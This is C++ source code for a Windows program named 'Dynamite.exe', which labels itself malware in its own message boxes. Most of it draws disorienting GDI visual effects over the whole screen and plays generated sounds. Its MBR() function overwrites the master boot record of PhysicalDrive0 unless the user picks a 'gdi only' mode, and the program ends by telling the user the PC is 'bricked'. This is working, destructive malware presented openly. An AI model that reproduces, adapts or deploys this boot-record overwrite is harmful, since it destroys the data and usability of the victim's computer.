VOID WINAPI sound18	() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 40000, 40000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const DWORD bufferSize = 40000 * 25;  // Buffer size for a longer duration
	const DWORD sampleSize = sizeof(char);

	// Adjust buffer size to be a multiple of the sample size
	const DWORD adjustedBufferSize = bufferSize - (bufferSize % sampleSize);
	char* buffer = new char[adjustedBufferSize];

	for (DWORD t = 0; t < adjustedBufferSize; ++t)
		buffer[t] = static_cast<char>((t & t / 2 & t / 4) * t / 4E3);

	WAVEHDR header = { buffer, adjustedBufferSize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);

	delete[] buffer; // Deallocate the buffer
}

/* SHADERS */
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			if (y != 0) rgbScreen[i].rgb += x / y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += 225;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 10, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -h + 10, SRCCOPY);
		Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x ^ y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 10, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -h + 10, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += GetRValue(x ^ y);
			rgbScreen[i].g += GetGValue(x ^ y);
			rgbScreen[i].b += GetBValue(x ^ y);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r = GetRValue(Hue(239));
			rgbScreen[i].g = GetGValue(Hue(239));
			rgbScreen[i].b = GetBValue(Hue(239));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

/* PAYLOADS */
DWORD WINAPI spiral_screen(LPVOID lpParam) {


	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	INT sw = 1920;
	INT sh = 1080;
	INT ulx = 0;
	INT uly = 0;
	INT brx = 1920;
	INT bry = 1080;
	double x = 0;

	double spiral_speed = .1;
	double distance = 100;
	while (1) {


		x++;
		ulx = round(sin(x * spiral_speed) * distance);
		uly = round(cos(x * spiral_speed) * distance);


		BitBlt(desk, ulx, uly, brx, bry, desk, 0, 0, SRCCOPY);

		Sleep(50);
	}
	ReleaseDC(wnd, desk); // Release the device context before exiting
	return 0;
}
DWORD WINAPI shapes(LPVOID lpParam) {

	HDC hdc = GetDC(0);

	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci(x - i / 2, y - i / 2, i, i);
			
			Sleep(100);
		}

	}
	DeleteDC(hdc);
	return 0;
}
DWORD WINAPI PanScreen(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	HDC hdc = GetDC(0);
	double dy = 0;
	double dx = 0;
	double angle = 0;
	double speed = 5;

	while (1) {
		BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, SRCCOPY);
		dx = ceil(sin(angle) * 10);
		dy = ceil(cos(angle) * 10);
		angle += speed/10;
		if (angle > atan(1) * 4) {
			angle = (atan(1) * 4 ) * -1;
		}
		Sleep(50);

	}

	
}
DWORD WINAPI xorfractal(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x ^ y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(100);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI rev_tunnel(LPVOID lpvd)
{
	HDC hdc;
	int sw, sh;

	while (1) {
		hdc = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(hdc, -20, -20, sw + 40, sh + 40, hdc, 0, 0, sw, sh, SRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(4);
	}
}
DWORD WINAPI text(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	Rectangle(hdc, 0,0, GetSystemMetrics(0), GetSystemMetrics(1));
	InvalidateRect(0, 0, 0);
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	LPCSTR text6 = 0;
	LPCSTR text7 = 0;
	LPCSTR text8 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "Dynamite.exe";
		text1 = "BOOM!";
		text2 = "KABOOM?";
		text3 = "Yes Rico, KABOOM!"; //Madagascar referene
		text4 = "THERE IS NO MERCY!!!";
		text5 = "NITRO-GLYCERINE!";
		text6 = "KNO3 + S10 + C15";
		text7 = "TNT";
		text8 = "BOOOOOOOOOOOOOOOOOOOOOOMMMMMM!!!!";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text7, strlen(text7));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text8, strlen(text8));
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI mandelbrot(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);

	// Variables for fractal pattern
	const double minX = -2.5;
	const double maxX = 1.0;
	const double minY = -1.0;
	const double maxY = 1.0;
	const int maxIterations = 20;

	// Time-based color shift
	const double colorShiftSpeed = 0.05; // Adjust the speed of color shift
	double time = 0.0;

	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			// Convert screen coordinates to fractal coordinates
			double a = minX + (maxX - minX) * x / w;
			double b = minY + (maxY - minY) * y / h;

			// Mandelbrot set iteration
			double ca = a;
			double cb = b;
			int n;
			for (n = 0; n < maxIterations; n++) {
				double aa = a * a - b * b;
				double bb = 2 * a * b;
				a = aa + ca;
				b = bb + cb;
				if (a * a + b * b > 4.0) {
					break;
				}
			}

			// Map the iteration count to a color value with time-based color shift
			double t = static_cast<double>(n) / maxIterations;
			COLORREF color1 = RGB(0, 0, 0);
			COLORREF color2 = RGB(255, 255, 255);
			COLORREF color = interpolateColors(color1, color2, t + std::sin(time));

			rgbScreen[i].rgb = color;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);

		// Increment time for color shift
		time += colorShiftSpeed;
	}

	return 0;
}
DWORD WINAPI RotateCubeThread(LPVOID lpParam) {
	SetProcessDPIAware();
	HDC hdc = GetDC(0);
	HDC memDC = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, SCREEN_WIDTH, SCREEN_HEIGHT);
	SelectObject(memDC, hBitmap);

	Cube cube = CreateCube(100);

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_real_distribution<double> distribution(-0.005, 0.005); // Random rotation speed range
	double rotation_speed = 5;
	double xSpeed = distribution(gen) * rotation_speed; // Random rotation speed for x-axis
	double ySpeed = distribution(gen) * rotation_speed; // Random rotation speed for y-axis
	double zSpeed = distribution(gen) * rotation_speed; // Random rotation speed for z-axis

	double t = 0.0; // Background color transition parameter
	double colorSpeed = 0.001; // Background color transition speed

	while (1) {
		RotateCube(cube, xSpeed, ySpeed, zSpeed);

		RECT rect = { 0, 0, SCREEN_WIDTH, SCREEN_HEIGHT };
		COLORREF backgroundColor = GetSmoothBackgroundColor(t);
		HBRUSH hBrush = CreateSolidBrush(backgroundColor);
		FillRect(memDC, &rect, hBrush);
		DeleteObject(hBrush);

		DrawCube(memDC, cube);

		t += colorSpeed; // Update background color transition parameter

		BitBlt(hdc, 0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, memDC, 0, 0, SRCCOPY);

		Sleep(10); // Adjust the sleep duration for smoother animation
	}

	DeleteObject(hBitmap);
	DeleteDC(memDC);
	ReleaseDC(0, hdc);
	return 0;
}
DWORD WINAPI gdihell(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 666, rand() % 666, w, h, hdc, rand() % 666, rand() % 666, NOTSRCERASE);
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI bouncing_circles(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Invert(LPVOID lpParam) {
	HDC hdc;
	int sw, sh;
	sw = GetSystemMetrics(0);
	sh = GetSystemMetrics(1);
	while (1) {
		hdc = GetDC(0);

		BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, PATINVERT);
		Sleep(250);
	}
}
DWORD WINAPI KABOOM(LPVOID lpParam)
{	

	

	InvalidateRect(0, 0, 0);
	sound5();
	
	
		sound18();
		/* SHAPES */
		HANDLE thread1 = CreateThread(0, 0, shapes, 0, 0, 0);
		
		/* Pan Screen */
		HANDLE thread3 = CreateThread(0, 0, PanScreen, 0, 0, 0);
		
		/* Reverse Tunnel */
		//HANDLE thread5 = CreateThread(0, 0, rev_tunnel, 0, 0, 0);
		
		/* Text */
		HANDLE thread6 = CreateThread(0, 0, text, 0, 0, 0);
		
		/* Gdi hell */
		//HANDLE thread9 = CreateThread(0, 0, gdihell, 0, 0, 0);
		
		/* Bouncing circles */
		HANDLE thread10 = CreateThread(0, 0, bouncing_circles, 0, 0, 0);
		
		/* Invert */
		HANDLE thread11 = CreateThread(0, 0, Invert, 0, 0, 0);
		
	
		/* SHADER 3*/
		HANDLE t_shader3 = CreateThread(0, 0, shader3, 0, 0, 0);
		
		

		Sleep(26000);
		
		//TerminateThread(thread9, 0);
		//CloseHandle(thread9);
		TerminateThread(thread6, 0);
		CloseHandle(thread6);
		//TerminateThread(thread5, 0);
		//CloseHandle(thread5);
		TerminateThread(thread10, 0);
		CloseHandle(thread10);
		TerminateThread(thread3, 0);
		CloseHandle(thread3);
		TerminateThread(thread1, 0);
		CloseHandle(thread1);
		TerminateThread(thread11, 0);
		CloseHandle(thread11);
		TerminateThread(t_shader3, 0);
		CloseHandle(t_shader3);

	return 0;
}
DWORD WINAPI juliaSet(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);

	// Variables for fractal pattern
	const double minX = -2.0;
	const double maxX = 2.0;
	const double minY = -2.0;
	const double maxY = 2.0;
	const int maxIterations = 20;

	// Julia set parameters
	const double cReal = -0.8; // Real part of the constant c
	const double cImaginary = 0.156; // Imaginary part of the constant c

	// Variable for animating the Julia set
	double animationVariable = 0.0;

	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			// Convert screen coordinates to fractal coordinates
			double a = minX + (maxX - minX) * x / w;
			double b = minY + (maxY - minY) * y / h;

			// Julia set iteration
			int n;
			for (n = 0; n < maxIterations; n++) {
				double aa = a * a - b * b;
				double bb = 2 * a * b;
				a = aa + cReal + std::sin(animationVariable);
				b = bb + cImaginary + std::cos(animationVariable);
				if (a * a + b * b > 4.0) {
					break;
				}
			}

			// Map the iteration count to a color value
			double t = static_cast<double>(n) / maxIterations;
			COLORREF color1 = RGB(0, 0, 0);
			COLORREF color2 = RGB(255, 255, 255);
			COLORREF color = interpolateColors(color1, color2, t);

			rgbScreen[i].rgb = color;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);

		// Animate the Julia set using a variable
		animationVariable += 0.1;

		Sleep(10); // Add a small delay for smoother animation
	}

	return 0;
}
DWORD WINAPI MBR() {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0
	);
	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0); //Write the file to the handle
	CloseHandle(hDevice); // close the handle function

	return 0;
}
DWORD WINAPI stretch(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, bm);
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		POINT pt[3];
		int inc3 = rand() % 700;
		int v = rand() % 2;
		if (v == 1) inc3 = -700;
		inc3++;
		pt[0].x = rect.left - inc3;
		pt[0].y = rect.top + inc3;
		pt[1].x = rect.right - inc3;
		pt[1].y = rect.top - inc3;
		pt[2].x = rect.left + inc3;
		pt[2].y = rect.bottom - inc3;
		PlgBlt(hdcMem, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, 0x123456);
		DeleteObject(hdcMem); DeleteObject(bm);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
	}






INT main() {
	bool destructive;
	SetProcessDPIAware();
	if (MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"Execute gdi only?\n(non-destructive)", L"Dynamite.exe", MB_YESNO | MB_ICONINFORMATION) == IDYES)
	{
		destructive = false;
	}
	else
	{
		destructive = true;
	}

	

		if (MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"THIS IS MALWARE, THAT WILL MAKE YOUR DEVICE UNUSABLE! (If you haven't chosen gdi-only mode)\nARE YOU SURE IF YOU WANT TO EXECUTE THIS PROGRAM?", L"WARNING", MB_YESNO | MB_ICONWARNING) == IDYES)
		{
			if (MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"LAST WARNING! DO YOU WANT TO RUN THIS PROGRAM?\nALL YOUR DATA WILL BE LOST!\nYOU WILL NOT BE ABLE TO USE YOUR PC AGAIN!\n(If you haven't chosen gdi-only mode)", L"WARNING", MB_YESNO | MB_ICONWARNING) == IDYES)
			{
				
				/* MBR */
				if (destructive == true)
				{
					MBR();
				}
				/* SHADER 1 */
				HANDLE t_shader1 = CreateThread(0, 0, shader1, 0, 0, 0);
				sound11();
				Sleep(10000);
				TerminateThread(t_shader1, 0);
				CloseHandle(t_shader1);
				InvalidateRect(0, 0, 0);


				/* SHAPES */
				HANDLE thread1 = CreateThread(0, 0, shapes, 0, 0, 0);
				sound1();
				Sleep(20000);
				TerminateThread(thread1, 0);
				CloseHandle(thread1);
				
				/* SCREEN SPIRAL */
				HANDLE thread2 = CreateThread(0, 0, spiral_screen, 0, 0, 0);
				sound2();
				Sleep(10000);
				TerminateThread(thread2, 0);
				CloseHandle(thread2);
				InvalidateRect(0, 0, 0);

				/* Pan Screen */
				HANDLE thread3 = CreateThread(0, 0, PanScreen, 0, 0, 0);
				sound3();
				Sleep(20000);
				TerminateThread(thread3, 0);
				CloseHandle(thread3);

				/* SHADER 2*/
				HANDLE t_shader2 = CreateThread(0, 0, shader2, 0, 0, 0);
				sound12();
				Sleep(30000);
				TerminateThread(t_shader2, 0);
				CloseHandle(t_shader2);
				

				/* XOR fractal */
				HANDLE thread4 = CreateThread(0, 0, xorfractal, 0, 0, 0);
				sound4();
				Sleep(30000);
				TerminateThread(thread4, 0);
				CloseHandle(thread4);

				/* Invert */
				HANDLE thread12 = CreateThread(0, 0, Invert, 0, 0, 0);
				sound11();
				Sleep(30000);
				TerminateThread(thread12, 0);
				CloseHandle(thread12);

				/* Reverse Tunnel */
				HANDLE thread5 = CreateThread(0, 0, rev_tunnel, 0, 0, 0);
				sound5();
				Sleep(20000);
				TerminateThread(thread5, 0);
				CloseHandle(thread5);
				InvalidateRect(0, 0, 0);

				/* SHADER 3*/
				HANDLE t_shader3 = CreateThread(0, 0, shader3, 0, 0, 0);
				sound13();
				Sleep(20000);
				TerminateThread(t_shader3, 0);
				CloseHandle(t_shader3);
				


				/* Text */
				HANDLE thread6 = CreateThread(0, 0, text, 0, 0, 0);
				sound6();
				Sleep(30000);
				TerminateThread(thread6, 0);
				CloseHandle(thread6);

				/* STRETCH */
				
				HANDLE t_staticbox = CreateThread(0, 0, stretch, 0, 0, 0);
				sound16();
				Sleep(20000);
				TerminateThread(t_staticbox, 0);
				CloseHandle(t_staticbox);

				/* Mandelbrot! */
				HANDLE thread7 = CreateThread(0, 0, mandelbrot, 0, 0, 0);
				sound7();
				Sleep(40000);
				TerminateThread(thread7, 0);
				CloseHandle(thread7);
				InvalidateRect(0, 0, 0);

				/* SHADER 4*/
				HANDLE t_shader4 = CreateThread(0, 0, shader4, 0, 0, 0);
				sound14();
				Sleep(20000);
				TerminateThread(t_shader4, 0);
				CloseHandle(t_shader4);
				
				/* 3D cube! */
				HANDLE thread8 = CreateThread(0, 0, RotateCubeThread, 0, 0, 0);
				sound8();
				Sleep(20000);
				TerminateThread(thread8, 0);
				CloseHandle(thread8);
				InvalidateRect(0, 0, 0);


				/* Gdi hell */
				HANDLE thread9 = CreateThread(0, 0, gdihell, 0, 0, 0);
				sound9();
				Sleep(30000);
				TerminateThread(thread9, 0);
				CloseHandle(thread9);

				/* SHADER 5*/
				HANDLE t_shader5 = CreateThread(0, 0, shader5, 0, 0, 0);
				sound15();
				Sleep(20000);
				TerminateThread(t_shader5, 0);
				CloseHandle(t_shader5);

				/* JULIA SET */
				HANDLE t_ship = CreateThread(0, 0, juliaSet, 0, 0, 0);
				sound17();
				Sleep(20000);
				TerminateThread(t_ship, 0);
				CloseHandle(t_ship);

				/* Bouncing circles */
				HANDLE thread10 = CreateThread(0, 0, bouncing_circles, 0, 0, 0);
				sound10();
				Sleep(40000);
				TerminateThread(thread10, 0);
				CloseHandle(thread10);
				InvalidateRect(0, 0, 0);
				Sleep(5000);

				/* KABOOM */
				HANDLE thread11 = CreateThread(0, 0, KABOOM, 0, 0, 0);
				Sleep(26000);

				TerminateThread(thread11, 0);
				CloseHandle(thread11);

				MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"Your PC is now bricked! Use it as long as you can!\nAfter the next reboot you won't be able to log in to windows anymore! Have fun :)", L"DYNAMITE.EXE", MB_OK | MB_ICONWARNING);

			}
			
		}
		
		
	
	
	
		
		return 0;
	
}